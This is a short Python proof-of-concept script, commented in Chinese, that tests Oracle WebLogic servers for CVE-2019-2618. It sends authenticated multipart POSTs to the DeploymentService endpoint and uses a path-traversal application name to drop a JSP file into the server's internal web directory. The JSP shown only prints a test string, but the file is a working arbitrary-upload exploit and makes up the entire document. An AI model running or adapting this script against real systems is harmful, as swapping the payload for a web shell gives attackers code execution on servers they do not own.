#coding=utf-8

import requests;
import sys;

print '''
 请依次输入 服务器IP或者域名 用户名 密码
 检测CVE-2019-2618漏洞的存在
 作者：wsfengfan474
'''

ip = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    "Referer": "https://www.google.com/",
    "content-type": "multipart/form-data; boundary=----123456789killweb987654321kill9090",
    "username": user,
    "password": password,
    "wl_upload_delta": "true",
    "wl_upload_application_name": "/../tmp/_WL_internal/bea_wls_internal/9j4dqk/war",
}

data = '----123456789killweb987654321kill9090\r\nContent-Disposition: form-data; name=\"test.jsp\";  filename=\"test.jsp\"\r\nContent-Type: false\r\n\r\n <%out.print("CVE-2019-2618_test_succeed");%> \r\n\r\n----123456789killweb987654321kill9090--'

url = ip + "/bea_wls_deployment_internal/DeploymentService"

response = requests.request("POST", url=url, data=data, headers=headers)

print(response.text)
print("可以查看相应的url，是否上传成功")